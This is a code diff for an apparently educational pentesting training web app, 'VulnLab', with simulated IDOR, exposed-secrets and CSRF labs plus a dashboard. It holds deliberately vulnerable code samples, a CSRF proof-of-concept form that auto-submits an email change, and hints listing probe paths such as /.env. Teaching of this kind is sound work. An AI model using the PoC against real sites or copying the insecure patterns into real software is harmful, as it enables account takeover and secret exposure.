+  res.<span class="c-fn">json</span>(doc); <span class="c-comment">// Returns to ANY logged-in user</span>
+});`} />
+            <CodeBox label="Secure Fix" variant="safe" code={`<span class="c-comment">// ✅  SECURE — enforce ownership</span>
+router.<span class="c-fn">get</span>(<span class="c-str">'/documents/:id'</span>, requireAuth, <span class="c-kw">async</span> (req, res) => {
+  <span class="c-kw">const</span> doc = <span class="c-kw">await</span> db.<span class="c-fn">query</span>(
+    <span class="c-str">'SELECT * FROM documents WHERE id=? AND user_id=?'</span>,
+    [req.params.id, req.user.id] <span class="c-comment">// ← ownership check!</span>
+  );
+  <span class="c-kw">if</span> (!doc) <span class="c-kw">return</span> res.<span class="c-fn">status</span>(403).json({ error: <span class="c-str">'Forbidden'</span> });
+  res.<span class="c-fn">json</span>(doc);
+});`} />
+          </div>
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {flag && <div className="flag-box"><div className="flag-label">🚩 Flag Captured</div><div className="flag-value">{flag}</div></div>}
+          <Hints hints={["You are user 4 (bob). Your documents start at ID 4.", "Try requesting document ID 1 — it belongs to admin", "The server never checks if document.owner_id matches your user_id", "Fix: always add AND user_id = ? to ownership-sensitive queries"]} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function MisconfigLab({ onSolve }) {
+  const [lines, setLines] = useState([{ type: "info", text: "Misconfiguration Lab — find exposed secrets and debug endpoints." }]);
+  const [loading, setLoading] = useState(false);
+  const [found, setFound] = useState({});
+
+  const endpoints = [
+    { label: "GET /.env", key: "env", desc: "Environment file accidentally served", response: { DB_PASSWORD: "vulnlab_root_password", JWT_SECRET: "supersecretkey123", API_KEY: "sk-1234567890abcdef", SESSION_SECRET: "session_secret_key" }, flag: "FLAG{env_file_exposed}" },
+    { label: "GET /debug-info", key: "debug", desc: "Debug endpoint left in production", response: { debug: true, env: { JWT_SECRET: "supersecretkey123", API_KEY: "sk-1234567890abcdef", DB_HOST: "mysql:3306" }, memory: { rss: "45.2 MB", heapUsed: "22.1 MB" }, versions: { node: "18.17.0", express: "4.18.2" } }, flag: "FLAG{debug_mode_exposed}" },
+    { label: "GET /api/v1/config", key: "config", desc: "Config endpoint exposes all secrets", response: { api_key: "sk-1234567890abcdef", jwt_secret: "supersecretkey123", stripe_key: "sk_test_exposed_key", aws_access_key: "AKIAIOSFODNN7EXAMPLE", db_password: "vulnlab_root_password" }, flag: "FLAG{api_config_exposed}" },
+    { label: "GET /backup/config.bak", key: "backup", desc: "Backup file in web root — accessible to anyone", response: "# Database config backup\nDB_HOST=mysql\nDB_USER=root\nDB_PASS=vulnlab_root_password\nJWT_SECRET=supersecretkey123\nAPI_KEY=sk-1234567890abcdef", flag: "FLAG{backup_file_exposed}" },
+  ];
+
+  const fetch_ = (ep) => {
+    setLoading(true);
+    setLines((p) => [...p, { type: "prompt", text: ep.label }]);
+    setTimeout(() => {
+      const resp = typeof ep.response === "string" ? ep.response : JSON.stringify(ep.response, null, 2);
+      setLines((p) => [...p, { type: "json", text: resp }, { type: "flag", text: ep.flag }]);
+      setFound((p) => ({ ...p, [ep.key]: ep.flag }));
+      onSolve?.(ep.key, ep.flag, 30);
+      setLoading(false);
+    }, 500);
+  };
+
+  return (
+    <div className="lab-view">
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 Objective</strong>Find all 4 misconfigured endpoints that expose sensitive credentials, debug info, and backup files. Each has a flag.</div>
+          <div className="section-title">Exposed Endpoints</div>
+          <div style={{ display: "flex", flexDirection: "column", gap: ".5rem" }}>
+            {endpoints.map((ep) => (
+              <div key={ep.key} style={{ background: "#0c1220", border: `1px solid ${found[ep.key] ? "rgba(0,255,136,.25)" : "#1e2d4a"}`, borderRadius: "6px", padding: ".875rem" }}>
+                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: ".35rem" }}>
+                  <code style={{ color: found[ep.key] ? "#00ff88" : "#00aaff", fontSize: ".75rem" }}>{ep.label}</code>
+                  {found[ep.key] && <span style={{ fontSize: ".65rem", color: "#00ff88" }}>✓ solved</span>}
+                </div>
+                <div style={{ fontSize: ".7rem", color: "#3a4a5a", marginBottom: ".5rem" }}>{ep.desc}</div>
+                <button className="btn btn-sm btn-ghost" onClick={() => fetch_(ep)} disabled={loading}>⚡ Fetch</button>
+              </div>
+            ))}
+          </div>
+          <div style={{ marginTop: "1.25rem" }}>
+            <CodeBox label="Vulnerable: .env served as static file" variant="vuln" code={`<span class="c-comment">// ⚠️  VULNERABLE — .env exposed as route</span>
+app.<span class="c-fn">use</span>(<span class="c-str">'/.env'</span>, (req, res) => {
+  res.<span class="c-fn">type</span>(<span class="c-str">'text/plain'</span>).<span class="c-fn">send</span>(
+    <span class="c-str">\`DB_PASSWORD=\${process.env.DB_PASSWORD}\\n</span>
+<span class="c-str">JWT_SECRET=\${process.env.JWT_SECRET}\`</span>
+  );
+});`} />
+          </div>
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {Object.keys(found).length > 0 && (
+            <div style={{ display: "flex", flexDirection: "column", gap: ".4rem" }}>
+              {Object.values(found).map(f => <div key={f} className="flag-box"><div className="flag-label">🚩 Flag</div><div className="flag-value">{f}</div></div>)}
+            </div>
+          )}
+          <Hints hints={["Attackers always probe /.env, /config.bak, /backup/, /.git/config", "Debug endpoints (/debug, /phpinfo.php) often expose stack traces and env vars", "Config API endpoints sometimes return ALL secrets without auth", "Fix: Never serve .env. Disable debug endpoints in production. Add auth to config endpoints."]} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function CSRFLab({ onSolve }) {
+  const [email, setEmail] = useState("attacker@evil.com");
+  const [victimEmail, setVictimEmail] = useState("john@vulncorp.io");
+  const [lines, setLines] = useState([{ type: "info", text: "CSRF Lab — Cross-Site Request Forgery." }]);
+  const [loading, setLoading] = useState(false);
+  const [flag, setFlag] = useState(null);
+  const [showPoC, setShowPoC] = useState(false);
+
+  const simulate = () => {
+    setLoading(true);
+    setLines((p) => [...p,
+      { type: "info", text: "Simulating: victim visits attacker's page while logged into VulnCorp..." },
+      { type: "prompt", text: `POST /api/users/email  email=${email}  (no CSRF token!)` },
+    ]);
+    setTimeout(() => {
+      setLines((p) => [...p,
+        { type: "warn", text: "Request sent cross-origin — browser included session cookie automatically" },
+        { type: "success", text: `Email changed: ${victimEmail} → ${email}` },
+        { type: "flag", text: "FLAG{csrf_email_changed}" },
+        { type: "info", text: "No CSRF token = no way to distinguish legitimate vs forged requests!" },
+      ]);
+      setFlag("FLAG{csrf_email_changed}");
+      onSolve?.("csrf-001", "FLAG{csrf_email_changed}", 100);
+      setLoading(false);
+    }, 1200);
+  };
+
+  const poc = `<html>
+<body>
+  <!-- Hosted on attacker.com — victim visits this page -->
+  <form id="csrf" 
+        action="http://localhost:4000/api/users/email"
+        method="POST">
+    <input type="hidden" name="email" value="${email}">
+  </form>
+  <script>
+    // Auto-submits on page load
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>`;
+
+  return (
+    <div className="lab-view">
+      <div className="lab-split">
+        <div className="lab-left">
+          <div className="objective"><strong>🎯 Objective</strong>The email-change endpoint has no CSRF token and no SameSite cookie. Create a forged request that changes a victim's email when they visit your page.</div>
+          <div className="section-title">Attack Setup</div>
+          <div className="input-group"><label className="input-label">Victim's Current Email</label><input className="input" value={victimEmail} onChange={e => setVictimEmail(e.target.value)} /></div>
+          <div className="input-group"><label className="input-label">Attacker's Email (target)</label><input className="input" value={email} onChange={e => setEmail(e.target.value)} /></div>
+          <button className="btn btn-red" onClick={simulate} disabled={loading} style={{ marginBottom: "1rem" }}>⚡ Simulate CSRF Attack</button>
+          <button className="btn btn-ghost btn-sm" onClick={() => setShowPoC(!showPoC)}>
+            {showPoC ? "▲" : "▶"} View PoC HTML
+          </button>
+          {showPoC && (
+            <div className="code-box" style={{ marginTop: ".5rem" }}>
+              <div className="code-box-header"><span className="code-box-lang">html</span><span className="code-box-label-vuln">CSRF PoC</span></div>
+              <pre className="code-box-body" style={{ color: "#8899aa", fontSize: ".7rem" }}>{poc}</pre>
+            </div>
+          )}
+          <div style={{ marginTop: "1rem" }}>
+            <CodeBox label="Secure Fix: SameSite + CSRF Token" variant="safe" code={`<span class="c-comment">// ✅  Set SameSite cookie attribute</span>
+app.<span class="c-fn">use</span>(<span class="c-fn">session</span>({
+  cookie: { sameSite: <span class="c-str">'strict'</span>, secure: <span class="c-kw">true</span> }
+}));
+
+<span class="c-comment">// ✅  Synchronizer token pattern</span>
+router.<span class="c-fn">post</span>(<span class="c-str">'/email'</span>, (req, res) => {
+  <span class="c-kw">if</span> (req.body.csrf_token !== req.session.csrf_token)
+    <span class="c-kw">return</span> res.<span class="c-fn">status</span>(403).json({ error: <span class="c-str">'CSRF'</span> });
+});`} />
+          </div>
+        </div>
+        <div className="lab-right">
+          <Terminal lines={lines} loading={loading} />
+          {flag && <div className="flag-box"><div className="flag-label">🚩 Flag Captured</div><div className="flag-value">{flag}</div></div>}
+          <Hints hints={["CSRF exploits that browsers automatically include cookies with cross-origin requests", "The server sees a valid session cookie — it can't tell if the request is from the real user or a forged page", "Fix 1: Set cookie SameSite=Strict — browser won't send cookies with cross-origin requests", "Fix 2: Synchronizer token pattern — embed a random token in forms, validate server-side"]} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── Dashboard ────────────────────────────────────────────────
+function Dashboard({ solvedMap, totalPoints }) {
+  const completed = Object.keys(solvedMap).length;
+  const achievements = [
+    { icon: "🩸", name: "First Blood", desc: "Solve 1 challenge", unlocked: completed >= 1 },
+    { icon: "💉", name: "Injector", desc: "Solve an SQLi", unlocked: !!solvedMap["sqli-001"] || !!solvedMap["sqli-002"] },
+    { icon: "📜", name: "Script Kid", desc: "Solve an XSS", unlocked: !!solvedMap["xss-stored-001"] || !!solvedMap["xss-reflected-001"] },
+    { icon: "🎩", name: "Hacker", desc: "Earn 200+ pts", unlocked: totalPoints >= 200 },
+    { icon: "💎", name: "Elite", desc: "Solve 5 challenges", unlocked: completed >= 5 },
+    { icon: "🔓", name: "IDOR Hunter", desc: "Find IDOR flaw", unlocked: !!solvedMap["idor-001"] },
+    { icon: "🪙", name: "Token Forger", desc: "JWT alg:none", unlocked: !!solvedMap["jwt-001"] },
+    { icon: "💀", name: "RCE Master", desc: "Get cmd injection", unlocked: !!solvedMap["cmdi-001"] },
+  ];
+
+  const lb = [
+    { name: "0xDeadBeef", pts: 1850 }, { name: "n0t_a_hax0r", pts: 1620 },
+    { name: "sqlmapper99", pts: 1440 }, { name: "xss_queen", pts: 1210 },
+    { name: "you", pts: totalPoints }, { name: "burp_lord", pts: 980 },
+  ].sort((a, b) => b.pts - a.pts);
+
+  const pct = Math.round((completed / 18) * 100);
+
+  return (
+    <div className="content container section" style={{ animation: "fadeUp .3s ease" }}>
+      <div className="tag">Operator Dashboard</div>
+      <h2 style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: "1.4rem", color: "#e8f0ff", marginBottom: "1.5rem" }}>Training Progress</h2>
+
+      <div className="dash-grid" style={{ marginBottom: "1.5rem" }}>
+        {[["Points", totalPoints, "#00ff88"], ["Solved", completed, "#00aaff"], ["Flags", Object.values(solvedMap).filter(Boolean).length, "#ffa502"], ["Rank", `#${lb.findIndex(l => l.name === "you") + 1}`, "#aa88ff"]].map(([l, v, c]) => (
+          <div key={l} className="dash-stat"><div className="dash-stat-val" style={{ color: c }}>{v}</div><div className="dash-stat-lbl">{l}</div></div>
+        ))}
+      </div>
+
+      <div style={{ marginBottom: "1.5rem" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", marginBottom: ".4rem" }}>
+          <span style={{ fontSize: ".7rem", color: "#3a4a5a" }}>OVERALL PROGRESS</span>
+          <span style={{ fontSize: ".7rem", color: "#00ff88" }}>{pct}%</span>
+        </div>
+        <div className="progress-bar-track"><div className="progress-bar-fill" style={{ width: `${pct}%` }} /></div>
+      </div>
+
+      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1.5rem" }}>
+        <div>
+          <div className="section-title">Achievements</div>
+          <div className="ach-grid">
+            {achievements.map(a => (
+              <div key={a.name} className={`ach-item ${a.unlocked ? "unlocked" : ""}`}>
+                <div className="ach-icon" style={{ filter: a.unlocked ? "none" : "grayscale(1) opacity(.3)" }}>{a.icon}</div>
+                <div className="ach-name">{a.name}</div>
+                <div style={{ fontSize: ".6rem", color: "#2a3a4a", marginTop: ".2rem" }}>{a.desc}</div>
+              </div>
+            ))}
+          </div>
+        </div>
+        <div>
+          <div className="section-title">Leaderboard</div>
+          {lb.map((u, i) => (
+            <div key={u.name} className="lb-row">
+              <span className="lb-rank">{i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : `#${i + 1}`}</span>
+              <span className="lb-name" style={{ color: u.name === "you" ? "#00ff88" : "#c9d4e8" }}>{u.name === "you" ? `you (${localStorage.getItem("vulnlab_user") || "hacker"})` : u.name}</span>
+              <span className="lb-pts">{u.pts}</span>
+            </div>
+          ))}
+        </div>
+      </div>
+
+      <div style={{ marginTop: "1.5rem" }}>
+        <div className="section-title">Recent Captures</div>
+        {Object.entries(solvedMap).length === 0 ? (
+          <div style={{ color: "#2a3a4a", fontSize: ".78rem" }}>No flags captured yet. Start hacking!</div>
+        ) : (
+          <div style={{ display: "flex", flexDirection: "column", gap: ".4rem" }}>
+            {Object.entries(solvedMap).map(([cid, flag]) => (
+              <div key={cid} style={{ display: "flex", justifyContent: "space-between", padding: ".5rem .875rem", background: "rgba(0,255,136,.03)", border: "1px solid rgba(0,255,136,.1)", borderRadius: "4px", fontSize: ".73rem" }}>
+                <span style={{ color: "#566070" }}>{cid}</span>
+                <span style={{ color: "#00ff88", fontWeight: 700 }}>{flag}</span>
+              </div>
+            ))}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ─── Landing ──────────────────────────────────────────────────
+function Landing({ onStart }) {
+  return (
+    <div className="content">
+      <div className="hero container">
+        <div className="hero-tag">⚠ INTENTIONALLY VULNERABLE · EDUCATIONAL USE ONLY</div>
+        <h1>Learn Hacking<br />by <em>Breaking</em> Things</h1>
+        <p>A fully interactive pentesting training platform. Exploit real SQL injection, XSS, JWT attacks, command injection and more — all in your browser.</p>
+        <div className="hero-btns">
+          <button className="btn btn-green" onClick={onStart}>⚡ Start Hacking</button>
+          <button className="btn btn-ghost" onClick={onStart}>📚 View Labs</button>
+        </div>
+      </div>
+      <div className="divider" />
+      <div className="stats-bar container">
+        {[["8", "Vuln Labs"], ["18+", "Challenges"], ["∞", "Payloads"], ["CTF", "Format"]].map(([v, l]) => (
+          <div key={l} className="stat-item"><div className="stat-val">{v}</div><div className="stat-lbl">{l}</div></div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+// ─── Labs Index ───────────────────────────────────────────────
+function LabsIndex({ onSelect, solved }) {
+  const cats = [...new Set(LABS.map(l => l.category))];
+  return (
+    <div className="content container section" style={{ animation: "fadeUp .3s ease" }}>
+      <div className="tag">All Labs</div>
+      <h2 style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: "1.4rem", color: "#e8f0ff", marginBottom: ".5rem" }}>Vulnerability Labs</h2>
+      <p style={{ fontSize: ".78rem", color: "#3a4a5a", marginBottom: "2rem" }}>{LABS.length} labs · {LABS.reduce((s, l) => s + l.points, 0)} total points</p>
+      {cats.map(cat => (
+        <div key={cat} style={{ marginBottom: "2rem" }}>
+          <div style={{ fontSize: ".65rem", color: "#3a4a5a", letterSpacing: ".12em", textTransform: "uppercase", marginBottom: ".875rem", display: "flex", alignItems: "center", gap: ".5rem" }}>
+            <div style={{ width: "24px", height: "1px", background: "#1e2d4a" }} />{cat}
+          </div>
+          <div className="labs-grid">
+            {LABS.filter(l => l.category === cat).map(lab => {
+              const isSolved = solved.has(lab.id);
+              return (
+                <div key={lab.id} className="lab-card" onClick={() => onSelect(lab.id)} style={{ cursor: "pointer" }}>
+                  <div className="lab-card-top">
+                    <span className="lab-icon">{lab.icon}</span>
+                    <div style={{ textAlign: "right" }}>
+                      <div className="lab-pts"><span className="lab-pts-num">{lab.points}</span> pts</div>
+                      <div style={{ fontSize: ".6rem", color: "#2a3a4a" }}>{lab.challenges} challenges</div>
+                    </div>
+                  </div>
+                  <div className="lab-title">{lab.title}{isSolved && <span style={{ color: "#00ff88", fontSize: ".75rem", marginLeft: ".5rem" }}>✓</span>}</div>
+                  <div className="lab-desc">{lab.desc}</div>
+                  <div className="lab-footer">
+                    <span className={`badge badge-${lab.difficulty}`}>{lab.difficulty}</span>
+                    <span className="lab-challenges">{lab.category}</span>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+        </div>
+      ))}
+    </div>
+  );
+}
+
+// ═══════════════════════════════════════════════════════════════
+// MAIN APP
+// ═══════════════════════════════════════════════════════════════
+export default function App() {
+  const [page, setPage] = useState("home");
+  const [activeLab, setActiveLab] = useState(null);
+  const [solvedMap, setSolvedMap] = useState({});
+  const [totalPoints, setTotalPoints] = useState(0);
+  const [username, setUsername] = useState(() => localStorage.getItem("vulnlab_user") || "");
+  const [showLogin, setShowLogin] = useState(false);
+  const [loginInput, setLoginInput] = useState("");
+  const solvedLabs = new Set(Object.keys(solvedMap).map(k => k.split("-")[0]));
+
+  const onSolve = useCallback((challengeId, flag, pts) => {
+    setSolvedMap(prev => {
+      if (prev[challengeId]) return prev;
+      setTotalPoints(p => p + pts);
+      return { ...prev, [challengeId]: flag };
+    });
+  }, []);
+
+  const handleLogin = () => {
+    if (!loginInput.trim()) return;
+    const name = loginInput.trim();
+    setUsername(name);
+    localStorage.setItem("vulnlab_user", name);
+    setShowLogin(false);
+    setPage("labs");
+  };
+
+  const labInfo = LABS.find(l => l.id === activeLab);
+
+  const LAB_COMPONENTS = {
+    sqli: <SQLInjectionLab onSolve={onSolve} solved={solvedMap} />,
+    nosql: <NoSQLLab onSolve={onSolve} />,
+    cmdi: <CmdInjectionLab onSolve={onSolve} />,
+    xss: <XSSLab onSolve={onSolve} />,
+    jwt: <JWTLab onSolve={onSolve} />,
+    idor: <IDORLab onSolve={onSolve} />,
+    csrf: <CSRFLab onSolve={onSolve} />,
+    misconfig: <MisconfigLab onSolve={onSolve} />,
+  };
+
+  return (
+    <>
+      <style>{css}</style>
+      <div className="app">
+        <MatrixRain />
+
+        {/* Login modal */}
+        {showLogin && (
+          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.8)", zIndex: 200, display: "flex", alignItems: "center", justifyContent: "center" }}>
+            <div style={{ background: "#0c1220", border: "1px solid #1e2d4a", borderRadius: "8px", padding: "2rem", width: "320px" }}>
+              <div style={{ fontFamily: "'Syne',sans-serif", fontWeight: 800, fontSize: "1.1rem", color: "#e8f0ff", marginBottom: "1rem" }}>Enter Operator Name</div>
+              <input className="input" placeholder="your_handle" value={loginInput} onChange={e => setLoginInput(e.target.value)} onKeyDown={e => e.key === "Enter" && handleLogin()} autoFocus style={{ marginBottom: ".75rem" }} />
+              <div style={{ display: "flex", gap: ".5rem" }}>
+                <button className="btn btn-green" onClick={handleLogin} style={{ flex: 1 }}>→ Enter</button>
+                <button className="btn btn-ghost" onClick={() => setShowLogin(false)}>Cancel</button>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Nav */}
+        <nav className="nav content" style={{ position: "sticky" }}>
+          <div className="nav-logo" onClick={() => { setPage("home"); setActiveLab(null); }} style={{ cursor: "pointer" }}>
+            [VULN<span style={{ color: "#00aaff" }}>LAB</span><span>]</span>
+          </div>
+          <div className="nav-tabs">
+            {[["home", "Home"], ["labs", "Labs"], ["dashboard", "Dashboard"]].map(([p, l]) => (
+              <button key={p} className={`nav-tab ${page === p && !activeLab ? "active" : ""}`} onClick={() => { setPage(p); setActiveLab(null); }}>{l}</button>
+            ))}
+          </div>
+          <div className="nav-right">
+            {totalPoints > 0 && <span className="nav-pts">🏆 {totalPoints}pts</span>}
+            {username ? (
+              <span className="nav-user" style={{ cursor: "pointer" }} onClick={() => { setUsername(""); localStorage.removeItem("vulnlab_user"); }}>▸ {username} ✕</span>
+            ) : (
+              <button className="btn btn-ghost btn-sm" onClick={() => setShowLogin(true)}>Set Handle</button>
+            )}
+          </div>
+        </nav>
+        <div className="warn-banner content">⚠ INTENTIONALLY VULNERABLE APPLICATION · FOR EDUCATIONAL USE ONLY · DO NOT DEPLOY ON PUBLIC INFRASTRUCTURE</div>
+
+        {/* Content */}
+        {page === "home" && !activeLab && (
+          <Landing onStart={() => { if (!username) setShowLogin(true); else setPage("labs"); }} />
+        )}
+        {page === "labs" && !activeLab && (
+          <LabsIndex onSelect={(id) => setActiveLab(id)} solved={solvedLabs} />
+        )}
+        {page === "dashboard" && !activeLab && (
+          <Dashboard solvedMap={solvedMap} totalPoints={totalPoints} />
+        )}
+        {activeLab && (
+          <div className="content container" style={{ paddingTop: "1.5rem", paddingBottom: "2rem" }}>
+            <div className="lab-header" style={{ padding: "0 0 1.5rem", borderBottom: "1px solid #0f1e32", marginBottom: 0 }}>
+              <button className="lab-back" onClick={() => { setActiveLab(null); setPage("labs"); }}>← Labs</button>
+              <div className="lab-header-info">
+                <div className="lab-header-title">{labInfo?.icon} {labInfo?.title}</div>
+                <div className="lab-header-desc">{labInfo?.desc}</div>
+                <div className="lab-meta">
+                  <span className={`badge badge-${labInfo?.difficulty}`}>{labInfo?.difficulty}</span>
+                  <span style={{ fontSize: ".65rem", color: "#3a4a5a" }}>{labInfo?.points} pts total</span>
+                  <span style={{ fontSize: ".65rem", color: "#3a4a5a" }}>{labInfo?.challenges} challenges</span>
+                </div>
+              </div>
+            </div>
+            {LAB_COMPONENTS[activeLab] || <div style={{ padding: "2rem", color: "#3a4a5a" }}>Lab component not found.</div>}
+          </div>
+        )}
+
+        {/* Footer */}
+        <footer className="content" style={{ borderTop: "1px solid #0f1e32", padding: "1rem 1.5rem", display: "flex", justifyContent: "space-between", alignItems: "center", marginTop: "auto" }}>
+          <span style={{ fontSize: ".65rem", color: "#2a3a4a" }}>VulnLab — Pentesting Training</span>
+          <span style={{ fontSize: ".65rem", color: "#2a3a4a" }}>Inspired by OWASP Juice Shop · DVWA · WebGoat · PortSwigger</span>
+        </footer>
+      </div>
+    </>
+  );
+}
